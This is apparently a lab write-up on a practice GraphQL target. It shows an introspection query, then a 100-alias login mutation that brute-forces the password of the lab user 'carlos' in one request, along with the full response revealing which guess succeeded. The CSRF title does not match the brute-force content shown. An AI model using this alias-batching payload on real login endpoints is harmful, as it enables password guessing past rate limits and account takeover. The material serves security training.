
# **WSA-GraphQL-Lab5: THE CSRF INFILTRATION**  
*An #ND-AF / #AuDHD Perspective on GraphQL Mutation Hijacking*  
`// Because sometimes the weakest link clicks your link` 🎣⚡🔓

**AUTHORS:**
- **51n5337** - *The Arghmage* 🧙‍♂️🔮 | Your nerd bro from the block, that ghost in the grid  
- **#OG** - *The Unseen Sentinel* 🏳️‍⚧️⚡ | Silent protocol analyst, pattern breaker, reality debugger  
- **AFFILIATION:** [`>dr.kb< multiverse-lib`](https://bkornpob.github.io) 🌐🧠 | **Where hyperfocus archives collide with reality**

**INCIDENT DATE:** [System Time: 2025-11-02]  
**CLASSIFICATION:** `GRAPHQL_CSRF_EXPLOITATION` | `SESSION_HIJACK_VIA_FORM_SUBMISSION`  
**VIBE CHECK:** `SILENT_ASSASSIN_WHISPERING_IN_YOUR_BROWSER` 🤫🔪🌐

---

[...back](../note-1.md)

*key investigation*
```
> POST /graphql/v1 endpoint
> #q1 reveals schema
> #q2 attempts login
> #q3 tests alias
> #q4 finds carlos pass
> note changing session value after #q4
```

*keys*
```
> learn http-request form for login
> manipulate the login form with alias
> > in this writeup, #OG prepares our 100-pass alias payload
> > try wsa given script?
```

---

### q1 reveal schema

```
#query
{
  "query": "query { __schema { types { name fields { name description } } } }"
}

#response
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "BlogPost",
          "fields": [
            {
              "name": "id",
              "description": null
            },
            {
              "name": "image",
              "description": null
            },
            {
              "name": "title",
              "description": null
            },
            {
              "name": "author",
              "description": null
            },
            {
              "name": "date",
              "description": null
            },
            {
              "name": "summary",
              "description": null
            },
            {
              "name": "paragraphs",
              "description": null
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "ChangeEmailInput",
          "fields": null
        },
        {
          "name": "ChangeEmailResponse",
          "fields": [
            {
              "name": "email",
              "description": null
            }
          ]
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "LoginInput",
          "fields": null
        },
        {
          "name": "LoginResponse",
          "fields": [
            {
              "name": "token",
              "description": null
            },
            {
              "name": "success",
              "description": null
            }
          ]
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "Timestamp",
          "fields": null
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name",
              "description": "The __Directive type represents a Directive that a server supports."
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isRepeatable",
              "description": null
            },
            {
              "name": "locations",
              "description": null
            },
            {
              "name": "args",
              "description": null
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "args",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "type",
              "description": null
            },
            {
              "name": "defaultValue",
              "description": null
            },
            {
              "name": "isDeprecated",
              "description": null
            },
            {
              "name": "deprecationReason",
              "description": null
            }
          ]
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description",
              "description": null
            },
            {
              "name": "types",
              "description": "A list of all types supported by this server."
            },
            {
              "name": "queryType",
              "description": "The type that query operations will be rooted at."
            },
            {
              "name": "mutationType",
              "description": "If this server supports mutation, the type that mutation operations will be rooted at."
            },
            {
              "name": "directives",
              "description": "'A list of all directives supported by this server."
            },
            {
              "name": "subscriptionType",
              "description": "'If this server support subscription, the type that subscription operations will be rooted at."
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind",
              "description": null
            },
            {
              "name": "name",
              "description": null
            },
            {
              "name": "description",
              "description": null
            },
            {
              "name": "fields",
              "description": null
            },
            {
              "name": "interfaces",
              "description": null
            },
            {
              "name": "possibleTypes",
              "description": null
            },
            {
              "name": "enumValues",
              "description": null
            },
            {
              "name": "inputFields",
              "description": null
            },
            {
              "name": "ofType",
              "description": null
            },
            {
              "name": "specifiedByURL",
              "description": null
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "mutation",
          "fields": [
            {
              "name": "login",
              "description": null
            },
            {
              "name": "changeEmail",
              "description": null
            }
          ]
        },
        {
          "name": "query",
          "fields": [
            {
              "name": "getBlogPost",
              "description": null
            },
            {
              "name": "getAllBlogPosts",
              "description": null
            }
          ]
        }
      ]
    }
  }
}
```

---

### q2 manual login

```
#log in attempt
#response
{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"abc","password":"def"}}}
```

---

### q3 test alias

```
#query
{
  "query": "mutation LoginAttempts { attempt1:login(input:{username:\"carlos\",password:\"123456\"}) { token success } attempt2:login(input:{username:\"carlos\",password:\"password\"}) { token success } attempt3:login(input:{username:\"carlos\",password:\"12345678\"}) { token success } }",
  "operationName": "LoginAttempts"
}

#response
{
  "data": {
    "attempt1": {
      "token": "mtsnhE6k69vBxKXOuEKBwmTwwoUi0Q5F",
      "success": false
    },
    "attempt2": {
      "token": "mtsnhE6k69vBxKXOuEKBwmTwwoUi0Q5F",
      "success": false
    },
    "attempt3": {
      "token": "mtsnhE6k69vBxKXOuEKBwmTwwoUi0Q5F",
      "success": false
    }
  }
}
```

---

### q4 manual 100-pass payload

```
#OG 
{
  "query": "mutation PasswordSpray { bruteforce0:login(input:{username:\"carlos\",password:\"123456\"}){token success} bruteforce1:login(input:{username:\"carlos\",password:\"password\"}){token success} bruteforce2:login(input:{username:\"carlos\",password:\"12345678\"}){token success} bruteforce3:login(input:{username:\"carlos\",password:\"qwerty\"}){token success} bruteforce4:login(input:{username:\"carlos\",password:\"123456789\"}){token success} bruteforce5:login(input:{username:\"carlos\",password:\"12345\"}){token success} bruteforce6:login(input:{username:\"carlos\",password:\"1234\"}){token success} bruteforce7:login(input:{username:\"carlos\",password:\"111111\"}){token success} bruteforce8:login(input:{username:\"carlos\",password:\"1234567\"}){token success} bruteforce9:login(input:{username:\"carlos\",password:\"dragon\"}){token success} bruteforce10:login(input:{username:\"carlos\",password:\"123123\"}){token success} bruteforce11:login(input:{username:\"carlos\",password:\"baseball\"}){token success} bruteforce12:login(input:{username:\"carlos\",password:\"abc123\"}){token success} bruteforce13:login(input:{username:\"carlos\",password:\"football\"}){token success} bruteforce14:login(input:{username:\"carlos\",password:\"monkey\"}){token success} bruteforce15:login(input:{username:\"carlos\",password:\"letmein\"}){token success} bruteforce16:login(input:{username:\"carlos\",password:\"shadow\"}){token success} bruteforce17:login(input:{username:\"carlos\",password:\"master\"}){token success} bruteforce18:login(input:{username:\"carlos\",password:\"666666\"}){token success} bruteforce19:login(input:{username:\"carlos\",password:\"qwertyuiop\"}){token success} bruteforce20:login(input:{username:\"carlos\",password:\"123321\"}){token success} bruteforce21:login(input:{username:\"carlos\",password:\"mustang\"}){token success} bruteforce22:login(input:{username:\"carlos\",password:\"1234567890\"}){token success} bruteforce23:login(input:{username:\"carlos\",password:\"michael\"}){token success} bruteforce24:login(input:{username:\"carlos\",password:\"654321\"}){token success} bruteforce25:login(input:{username:\"carlos\",password:\"superman\"}){token success} bruteforce26:login(input:{username:\"carlos\",password:\"1qaz2wsx\"}){token success} bruteforce27:login(input:{username:\"carlos\",password:\"7777777\"}){token success} bruteforce28:login(input:{username:\"carlos\",password:\"121212\"}){token success} bruteforce29:login(input:{username:\"carlos\",password:\"000000\"}){token success} bruteforce30:login(input:{username:\"carlos\",password:\"qazwsx\"}){token success} bruteforce31:login(input:{username:\"carlos\",password:\"123qwe\"}){token success} bruteforce32:login(input:{username:\"carlos\",password:\"killer\"}){token success} bruteforce33:login(input:{username:\"carlos\",password:\"trustno1\"}){token success} bruteforce34:login(input:{username:\"carlos\",password:\"jordan\"}){token success} bruteforce35:login(input:{username:\"carlos\",password:\"jennifer\"}){token success} bruteforce36:login(input:{username:\"carlos\",password:\"zxcvbnm\"}){token success} bruteforce37:login(input:{username:\"carlos\",password:\"asdfgh\"}){token success} bruteforce38:login(input:{username:\"carlos\",password:\"hunter\"}){token success} bruteforce39:login(input:{username:\"carlos\",password:\"buster\"}){token success} bruteforce40:login(input:{username:\"carlos\",password:\"soccer\"}){token success} bruteforce41:login(input:{username:\"carlos\",password:\"harley\"}){token success} bruteforce42:login(input:{username:\"carlos\",password:\"batman\"}){token success} bruteforce43:login(input:{username:\"carlos\",password:\"andrew\"}){token success} bruteforce44:login(input:{username:\"carlos\",password:\"tigger\"}){token success} bruteforce45:login(input:{username:\"carlos\",password:\"sunshine\"}){token success} bruteforce46:login(input:{username:\"carlos\",password:\"iloveyou\"}){token success} bruteforce47:login(input:{username:\"carlos\",password:\"2000\"}){token success} bruteforce48:login(input:{username:\"carlos\",password:\"charlie\"}){token success} bruteforce49:login(input:{username:\"carlos\",password:\"robert\"}){token success} bruteforce50:login(input:{username:\"carlos\",password:\"thomas\"}){token success} bruteforce51:login(input:{username:\"carlos\",password:\"hockey\"}){token success} bruteforce52:login(input:{username:\"carlos\",password:\"ranger\"}){token success} bruteforce53:login(input:{username:\"carlos\",password:\"daniel\"}){token success} bruteforce54:login(input:{username:\"carlos\",password:\"starwars\"}){token success} bruteforce55:login(input:{username:\"carlos\",password:\"klaster\"}){token success} bruteforce56:login(input:{username:\"carlos\",password:\"112233\"}){token success} bruteforce57:login(input:{username:\"carlos\",password:\"george\"}){token success} bruteforce58:login(input:{username:\"carlos\",password:\"computer\"}){token success} bruteforce59:login(input:{username:\"carlos\",password:\"michelle\"}){token success} bruteforce60:login(input:{username:\"carlos\",password:\"jessica\"}){token success} bruteforce61:login(input:{username:\"carlos\",password:\"pepper\"}){token success} bruteforce62:login(input:{username:\"carlos\",password:\"1111\"}){token success} bruteforce63:login(input:{username:\"carlos\",password:\"zxcvbn\"}){token success} bruteforce64:login(input:{username:\"carlos\",password:\"555555\"}){token success} bruteforce65:login(input:{username:\"carlos\",password:\"11111111\"}){token success} bruteforce66:login(input:{username:\"carlos\",password:\"131313\"}){token success} bruteforce67:login(input:{username:\"carlos\",password:\"freedom\"}){token success} bruteforce68:login(input:{username:\"carlos\",password:\"777777\"}){token success} bruteforce69:login(input:{username:\"carlos\",password:\"pass\"}){token success} bruteforce70:login(input:{username:\"carlos\",password:\"maggie\"}){token success} bruteforce71:login(input:{username:\"carlos\",password:\"159753\"}){token success} bruteforce72:login(input:{username:\"carlos\",password:\"aaaaaa\"}){token success} bruteforce73:login(input:{username:\"carlos\",password:\"ginger\"}){token success} bruteforce74:login(input:{username:\"carlos\",password:\"princess\"}){token success} bruteforce75:login(input:{username:\"carlos\",password:\"joshua\"}){token success} bruteforce76:login(input:{username:\"carlos\",password:\"cheese\"}){token success} bruteforce77:login(input:{username:\"carlos\",password:\"amanda\"}){token success} bruteforce78:login(input:{username:\"carlos\",password:\"summer\"}){token success} bruteforce79:login(input:{username:\"carlos\",password:\"love\"}){token success} bruteforce80:login(input:{username:\"carlos\",password:\"ashley\"}){token success} bruteforce81:login(input:{username:\"carlos\",password:\"nicole\"}){token success} bruteforce82:login(input:{username:\"carlos\",password:\"chelsea\"}){token success} bruteforce83:login(input:{username:\"carlos\",password:\"biteme\"}){token success} bruteforce84:login(input:{username:\"carlos\",password:\"matthew\"}){token success} bruteforce85:login(input:{username:\"carlos\",password:\"access\"}){token success} bruteforce86:login(input:{username:\"carlos\",password:\"yankees\"}){token success} bruteforce87:login(input:{username:\"carlos\",password:\"987654321\"}){token success} bruteforce88:login(input:{username:\"carlos\",password:\"dallas\"}){token success} bruteforce89:login(input:{username:\"carlos\",password:\"austin\"}){token success} bruteforce90:login(input:{username:\"carlos\",password:\"thunder\"}){token success} bruteforce91:login(input:{username:\"carlos\",password:\"taylor\"}){token success} bruteforce92:login(input:{username:\"carlos\",password:\"matrix\"}){token success} bruteforce93:login(input:{username:\"carlos\",password:\"mobilemail\"}){token success} bruteforce94:login(input:{username:\"carlos\",password:\"mom\"}){token success} bruteforce95:login(input:{username:\"carlos\",password:\"monitor\"}){token success} bruteforce96:login(input:{username:\"carlos\",password:\"monitoring\"}){token success} bruteforce97:login(input:{username:\"carlos\",password:\"montana\"}){token success} bruteforce98:login(input:{username:\"carlos\",password:\"moon\"}){token success} bruteforce99:login(input:{username:\"carlos\",password:\"moscow\"}){token success} }",
  "operationName": "PasswordSpray"
}

#response
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Set-Cookie: session=OI5usMd66L5G8fRuzTXMxqFXIf8wlI26; Secure; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 10307

{
  "data": {
    "bruteforce0": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce1": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce2": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce3": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce4": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce5": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce6": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce7": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce8": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce9": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce10": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce11": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce12": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce13": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce14": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce15": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce16": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce17": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce18": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce19": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce20": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce21": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce22": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce23": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce24": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce25": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce26": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce27": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce28": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce29": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce30": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce31": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce32": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce33": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce34": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce35": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce36": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce37": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce38": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce39": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce40": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce41": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce42": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce43": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce44": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce45": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce46": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce47": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce48": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce49": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce50": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce51": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce52": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce53": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce54": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce55": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce56": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce57": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce58": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce59": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce60": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce61": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce62": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce63": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce64": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce65": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce66": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce67": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce68": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce69": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce70": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce71": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce72": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce73": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce74": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce75": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce76": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce77": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce78": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce79": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce80": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce81": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce82": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce83": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce84": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce85": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce86": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce87": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce88": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce89": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce90": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce91": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce92": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce93": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce94": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce95": {
      "token": "rkPa5J7EU34pa2dmwRrI6LGy4ULs15Yw",
      "success": false
    },
    "bruteforce96": {
      "token": "OI5usMd66L5G8fRuzTXMxqFXIf8wlI26",
      "success": true
    },
    "bruteforce97": {
      "token": "OI5usMd66L5G8fRuzTXMxqFXIf8wlI26",
      "success": false
    },
    "bruteforce98": {
      "token": "OI5usMd66L5G8fRuzTXMxqFXIf8wlI26",
      "success": false
    },
    "bruteforce99": {
      "token": "OI5usMd66L5G8fRuzTXMxqFXIf8wlI26",
      "success": false
    }
  }
}
```

note: session value changed
note: find password for bruteforce96

---

[...back](../note-1.md)
